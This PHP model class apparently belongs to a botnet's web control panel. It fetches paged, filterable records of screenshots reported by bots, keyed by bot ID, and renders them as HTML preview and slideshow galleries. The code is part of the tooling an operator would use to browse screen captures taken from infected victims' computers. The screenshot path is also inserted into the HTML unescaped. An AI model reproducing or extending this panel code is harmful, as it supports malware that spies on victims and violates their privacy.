<?php

require_once 'application/models/accessory_models/PaginationWorker.php';

class Model_Screenshots extends Model
{

    public function get_data()
    {

    }

    public function getScreenshotsData()
    {
        if (empty($this->request_data['pageSize']) || empty($this->request_data['pageNumber']))
        {
            return NULL;
        }

        $paginationWorker = new PaginationWorker($this->request_data['pageSize'], $this->request_data['pageNumber']);

        $generalFilter = base64_decode($this->request_data['filter']);

        if (!empty($generalFilter))
        {
            $paginationWorker->setFilter(
                ' AND (bots.botid LIKE :filter OR 
                    reports_screenshots.description LIKE :filter)
                ', array(':filter' => $generalFilter));
        }

        $screenShots = $this->getDB()->queryRows(
            'SELECT reports_screenshots.path as path,reports_screenshots.description as description,bots.botid as botid FROM reports_screenshots, bots WHERE (bots.id = reports_screenshots.bot_id)' . $paginationWorker->getFilterText() . $paginationWorker->getOrderBy('reports_screenshots.id', true) . $paginationWorker->getLimit(), $paginationWorker->getFilterValues());

        $totalCount = $this->getDB()->queryValue(
            'SELECT COUNT(reports_screenshots.id) FROM reports_screenshots, bots WHERE (bots.id = reports_screenshots.bot_id)'.$paginationWorker->getFilterText() . $paginationWorker->getOrderBy('reports_screenshots.id', true),
            $paginationWorker->getFilterValues());

        $responseData = $paginationWorker->getJsonEncodedData($totalCount, $screenShots, static function($dataRow) {
            $screenshotData = new ScreenShotElement($dataRow, $_SERVER['SERVER_NAME']);
            return array($screenshotData->previewData, $screenshotData->slideShowData);
        });

        return $responseData;
    }
}

class ScreenShotElement
{
    public $previewData;
    public $slideShowData;

    public function __construct($screenShotData, $server_url)
    {
        $this->previewData = '
                            <li>
                                <figure>
                                    <img src="/' . $screenShotData['path'] . '" alt="img01"/>
                                    <figcaption>
                                        <h5>BOT ID: ' . htmlspecialchars($screenShotData['botid']) . '</h5>
                                        <p>'. htmlspecialchars($screenShotData['description']) .'</p>
                                    </figcaption>
                                </figure>
                            </li>';
        $this->slideShowData = '
                            <li>
                                <figure>
                                    <figcaption>
                                        <h3>BOT ID: ' . htmlspecialchars($screenShotData['botid']) . '</h3>
                                        <p>'. htmlspecialchars($screenShotData['description']) .'</p>
                                    </figcaption>
                                    <img src="/' . $screenShotData['path'] . '" alt="img01"/>
                                </figure>
                            </li>';
    }
}